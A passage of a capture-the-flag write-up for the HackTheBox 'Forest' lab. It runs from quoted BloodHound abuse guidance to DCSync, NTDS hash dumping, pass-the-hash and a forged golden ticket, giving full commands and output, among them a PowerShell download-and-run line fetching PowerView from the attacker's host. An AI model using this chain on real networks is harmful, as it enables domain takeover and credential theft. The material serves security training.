There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).

To abuse this privilege with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as a member of ACCOUNT OPERATORS@HTB.LOCAL if you are not running a process as a member. To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):
~~~
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
~~~

Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as ACCOUNT OPERATORS@HTB.LOCAL:
~~~
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred
~~~

Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:
~~~
Get-DomainGroupMember -Identity 'Domain Admins'
~~~
```

`WriteDacl`:
```
Info:

The members of the group EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL have permissions to modify the DACL (Discretionary Access Control List) on the domain HTB.LOCAL

With write access to the target object's DACL, you can grant yourself any privilege you want on the object.
```
```
Windows Abuse:

To abuse WriteDacl to a domain object, you may grant yourself DCSync privileges.

You may need to authenticate to the Domain Controller as a member of EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL if you are not running a process as a member. To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):
~~~
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
~~~

Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL:
~~~
Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync
~~~

Once you have granted yourself this privilege, you may use the mimikatz dcsync function to dcsync the password of arbitrary principals on the domain
~~~
lsadump::dcsync /domain:testlab.local /user:Administrator
~~~

Cleanup can be done using the Remove-DomainObjectAcl function:
~~~
Remove-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync
~~~

You can also abuse this without using Windows-based tooling if you are operating from a Linux host. DCSync.py from n00py will let you authenticate with either a plaintext password, NT hash, or kerberos ticket:

To grant the "n00py" user DCSync privileges, authenticating as the user "n00py" with the password "Password123":
~~~
./dcsync.py -dc dc01.n00py.local -t 'CN=n00py,OU=Employees,DC=n00py,DC=local'  n00pyAdministrator:Password123
~~~

Source: [https://github.com/n00py/DCSync](https://github.com/n00py/DCSync)
```

`locate -i powerview.ps1`:
```
/home/kali/.local/lib/python3.11/site-packages/pwncat/data/PowerSploit/Recon/PowerView.ps1
/home/kali/pwncat/venv/lib/python3.11/site-packages/pwncat/data/PowerSploit/Recon/PowerView.ps1
/usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/powerview.ps1
/usr/share/windows-resources/powersploit/Recon/PowerView.ps1 ←
```

`cp /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/powerview.ps1 ./pv.ps1`

`python3 -m http.server 80`:
```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

![Victim: svc-alfresco](https://custom-icon-badges.demolab.com/badge/Victim-svc%2D-alfresco-64b5f6?logo=windows11&logoColor=white)

`net user`:
```
User accounts for \\

-------------------------------------------------------------------------------
$331000-VK4ADACQNUCA     Administrator            andy
DefaultAccount           Guest                    HealthMailbox0659cc1
HealthMailbox670628e     HealthMailbox6ded678     HealthMailbox7108a4e
HealthMailbox83d6781     HealthMailbox968e74d     HealthMailboxb01ac64
HealthMailboxc0a90c9     HealthMailboxc3d7722     HealthMailboxfc9daad
HealthMailboxfd87238     krbtgt                   lucinda
mark                     santi                    sebastien
SM_1b41c9286325456bb     SM_1ffab36a2f5f479cb     SM_2c8eef0a09b545acb
SM_681f53d4942840e18     SM_75a538d3025e4db9a     SM_7c96b981967141ebb
SM_9b69f1b9d2cc45549     SM_c75ee099d0a64c91b     SM_ca8c2ed5bdab4dc9b
svc-alfresco
The command completed with one or more errors.
```

`net user /add /domain hacker 'H4ck3d!'`:
```
The command completed successfully.
```

`net user hacker`:
```
User name                    hacker
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/24/2024 1:00:22 AM
Password expires             Never
Password changeable          10/25/2024 1:00:22 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users ←
The command completed successfully.
```

`net group "Exchange Windows Permissions"`:
```
Group name     Exchange Windows Permissions
Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.

Members ←

-------------------------------------------------------------------------------
The command completed successfully.
```

`net user svc-alfresco`:
```
User name                    svc-alfresco
Full Name                    svc-alfresco
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/24/2024 1:17:04 AM
Password expires             Never
Password changeable          10/25/2024 1:17:04 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/23/2024 5:40:10 AM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users         *Service Accounts ←
The command completed successfully.
```

`iex(New-Object Net.WebClient).DownloadString("http://10.10.16.7/pv.ps1")`

`Add-DomainGroupMember -Identity 'Exchange Windows Permissions' -Members 'hacker'`

`Get-DomainGroupMember -Identity 'Exchange Windows Permissions'`:
```
GroupDomain             : htb.local
GroupName               : Exchange Windows Permissions ←
GroupDistinguishedName  : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
MemberDomain            : htb.local
MemberName              : hacker ←
MemberDistinguishedName : CN=hacker,CN=Users,DC=htb,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-3072663084-364016917-1341370565-10618

GroupDomain             : htb.local
GroupName               : Exchange Windows Permissions
GroupDistinguishedName  : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
MemberDomain            : htb.local
MemberName              : Exchange Trusted Subsystem
MemberDistinguishedName : CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=htb,DC=local
MemberObjectClass       : group
MemberSID               : S-1-5-21-3072663084-364016917-1341370565-1119
```

`net user hacker`:
```
User name                    hacker
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/24/2024 1:13:54 AM
Password expires             Never
Password changeable          10/25/2024 1:13:54 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Exchange Windows Perm*Domain Users
The command completed successfully.
```

`$SecPassword = ConvertTo-SecureString 'H4ck3d!' -AsPlainText -Force; $Cred = New-Object System.Management.Automation.PSCredential('htb.local\hacker', $SecPassword)`

`Add-DomainObjectAcl -Credential $Cred -TargetIdentity 'DC=htb,DC=local' -PrincipalIdentity 'hacker' -Rights DCSync`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`crackmapexec smb 10.10.10.161 -u 'hacker' -p 'H4ck3d!'`:
```
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\hacker:H4ck3d! ← 
```

`impacket-secretsdump -dc-ip 10.10.10.161 'htb.local/hacker:H4ck3d!@10.10.10.161'`:
```
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: ←
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8::: ←
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
hacker:10607:aad3b435b51404eeaad3b435b51404ee:bc4103a138c65bd0c9c68cde4333c155:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:cc654fccde36bae08050e26865d44c68:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8

[...]

hacker:aes256-cts-hmac-sha1-96:f126f900e2cd6338771da6df6bda32b06c9bc0ef1cd6c0caa5f9a56b66a4ee82
hacker:aes128-cts-hmac-sha1-96:8479a86cf8278b82bc0e1d0b11e0bc0b
hacker:des-cbc-md5:c434c4d937f7ea70
FOREST$:aes256-cts-hmac-sha1-96:bd4843b621b97a93ad13c88f8200a123b49615bd8b5cbc9a05beaaf6830b75d4
FOREST$:aes128-cts-hmac-sha1-96:2317f6fa6b5b0a56ad3d6e565d861a7d
FOREST$:des-cbc-md5:43408925e019ba9b
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up...
```

`vim ./krbtgt.txt`:
```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8::: ←
```

`crackmapexec smb 10.10.10.161 -u 'administrator' -H 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6'`:
```
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!) ←
```

`crackmapexec smb 10.10.10.161 -u 'administrator' -H 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6' --shares`:
```
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)
SMB         10.10.10.161    445    FOREST           [*] Enumerated shares
SMB         10.10.10.161    445    FOREST           Share           Permissions     Remark
SMB         10.10.10.161    445    FOREST           -----           -----------     ------
SMB         10.10.10.161    445    FOREST           ADMIN$          READ,WRITE ←     Remote Admin
SMB         10.10.10.161    445    FOREST           C$              READ,WRITE ←      Default share
SMB         10.10.10.161    445    FOREST           IPC$                            Remote IPC
SMB         10.10.10.161    445    FOREST           NETLOGON        READ,WRITE      Logon server share 
SMB         10.10.10.161    445    FOREST           SYSVOL          READ            Logon server share
```

`crackmapexec smb 10.10.10.161 -u 'administrator' -H 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6' -x 'whoami'`:
```
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\administrator:32693b11e6aa90eb43d32c72a07ceea6 (Pwn3d!)
SMB         10.10.10.161    445    FOREST           [+] Executed command via wmiexec
SMB         10.10.10.161    445    FOREST           htb\administrator ←
```

`impacket-psexec 'htb.local/administrator@10.10.10.161' -hashes 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6'`:
```
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$ ←
[*] Uploading file LXSnIyFj.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service WAxK on 10.10.10.161.....
[*] Starting service WAxK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

![Victim: system](https://custom-icon-badges.demolab.com/badge/Victim-system-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
nt authority\system ←
```

`whoami /groups`:
```
GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner    
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
Mandatory Label\System Mandatory Level Label            S-1-16-16384
```

`whoami /priv`:
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled 
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled 
SeAuditPrivilege                          Generate security audits                                           Enabled 
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
SeTimeZonePrivilege                       Change the time zone                                               Enabled 
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 
```

`cd C:\Users\Administrator\Desktop`

`dir`:
```
 Volume in drive C has no label.
 Volume Serial Number is 61F2-A88F

 Directory of C:\Users\Administrator\Desktop

09/23/2019  02:15 PM    <DIR>          .
09/23/2019  02:15 PM    <DIR>          ..
10/23/2024  05:34 AM                34 root.txt ←
               1 File(s)             34 bytes
               2 Dir(s)  10,276,347,904 bytes free
```

`type root.txt`:
```
02eac*************************** ←
```

`powershell.exe`

`iex(New-Object Net.WebClient).DownloadString("http://10.10.16.7/pv.ps1")`

`Get-DomainGroupMember -Identity 'Remote Management Users'`:
```
GroupDomain             : htb.local
GroupName               : Remote Management Users
GroupDistinguishedName  : CN=Remote Management Users,CN=Builtin,DC=htb,DC=local
MemberDomain            : htb.local
MemberName              : Privileged IT Accounts ←
MemberDistinguishedName : CN=Privileged IT Accounts,OU=Security 
                          Groups,DC=htb,DC=local
MemberObjectClass       : group
MemberSID               : S-1-5-21-3072663084-364016917-1341370565-1149
```

`Get-DomainGroupMember -Identity 'Domain Admins'`:
```
GroupDomain             : htb.local
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=htb,DC=local
MemberDomain            : htb.local
MemberName              : Administrator ←
MemberDistinguishedName : CN=Administrator,CN=Users,DC=htb,DC=local
MemberObjectClass       : user
MemberSID               : S-1-5-21-3072663084-364016917-1341370565-500
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`crackmapexec winrm 10.10.10.161 -u 'administrator' -H 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6'`:
```
SMB         10.10.10.161    5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)
HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman
HTTP        10.10.10.161    5985   FOREST           [-] htb.local\administrator:32693b11e6aa90eb43d32c72a07ceea6 ←
```

`evil-winrm -i 10.10.10.161 -u 'administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'`:
```
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint ←
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

![Victim: administrator](https://custom-icon-badges.demolab.com/badge/Victim-administrator-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
htb\administrator ←
```

`whoami /group`:
```
GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ===============================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544                                  Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
HTB\Group Policy Creator Owners            Group            S-1-5-21-3072663084-364016917-1341370565-520  Mandatory group, Enabled by default, Enabled group
HTB\Domain Admins                          Group            S-1-5-21-3072663084-364016917-1341370565-512  Mandatory group, Enabled by default, Enabled group
HTB\Enterprise Admins                      Group            S-1-5-21-3072663084-364016917-1341370565-519  Mandatory group, Enabled by default, Enabled group
HTB\Organization Management                Group            S-1-5-21-3072663084-364016917-1341370565-1104 Mandatory group, Enabled by default, Enabled group
HTB\Schema Admins                          Group            S-1-5-21-3072663084-364016917-1341370565-518  Mandatory group, Enabled by default, Enabled group
HTB\Denied RODC Password Replication Group Alias            S-1-5-21-3072663084-364016917-1341370565-572  Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

`whoami /priv`:
```
PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

`Get-ADDomain htb.local`:
```
AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=htb,DC=local
DeletedObjectsContainer            : CN=Deleted Objects,DC=htb,DC=local
DistinguishedName                  : DC=htb,DC=local
DNSRoot                            : htb.local
DomainControllersContainer         : OU=Domain Controllers,DC=htb,DC=local
DomainMode                         : Windows2016Domain
DomainSID                          : S-1-5-21-3072663084-364016917-1341370565 ←
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=htb,DC=local
Forest                             : htb.local
InfrastructureMaster               : FOREST.htb.local
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=htb,DC=local}
LostAndFoundContainer              : CN=LostAndFound,DC=htb,DC=local
ManagedBy                          :
Name                               : htb
NetBIOSName                        : HTB
ObjectClass                        : domainDNS
ObjectGUID                         : dff0c71a-a949-4b26-8c7b-52e3e2cb6eab
ParentDomain                       :
PDCEmulator                        : FOREST.htb.local
PublicKeyRequiredPasswordRolling   : True
QuotasContainer                    : CN=NTDS Quotas,DC=htb,DC=local
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {FOREST.htb.local}
RIDMaster                          : FOREST.htb.local
SubordinateReferences              : {DC=ForestDnsZones,DC=htb,DC=local, DC=DomainDnsZones,DC=htb,DC=local, CN=Configuration,DC=htb,DC=local}
SystemsContainer                   : CN=System,DC=htb,DC=local
UsersContainer                     : CN=Users,DC=htb,DC=local
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`cat ./krbtgt.txt`:
```
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8::: ←
```

`impacket-ticketer -nthash '819af826bb148e603acb0f33d17632f8' -domain-sid 'S-1-5-21-3072663084-364016917-1341370565' -domain 'htb.local' 'h4x0r'`:
```
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for htb.local/h4x0r
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncAsRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncASRepPart
[*] Saving ticket in h4x0r.ccache ←
```

`export KRB5CCNAME=h4x0r.ccache`

<❌ Failed Step>

`impacket-psexec 'htb.local/h4x0r@10.10.10.161' -k -no-pass`:
```
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[-] [Errno Connection error (HTB.LOCAL:88)] [Errno -2] Name or service not known ←
```

</❌ Failed Step>

<❌ Failed Step>

`impacket-psexec 'htb.local/h4x0r@forest' -k -no-pass`:
```
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

</❌ Failed Step>

`ntpdate 10.10.10.161`:
```
2024-10-24 15:38:32.723856 (+0200) +408.084919 +/- 0.024939 10.10.10.161 s1 no-leap
CLOCK: time stepped by 408.084919
```

`impacket-psexec 'htb.local/h4x0r@forest' -k -no-pass`:
```
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on forest.....
[*] Found writable share ADMIN$
[*] Uploading file ETixpDvM.exe
[*] Opening SVCManager on forest.....
[*] Creating service iwWm on forest.....
[*] Starting service iwWm.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

![Victim: system](https://custom-icon-badges.demolab.com/badge/Victim-system-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
nt authority\system ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
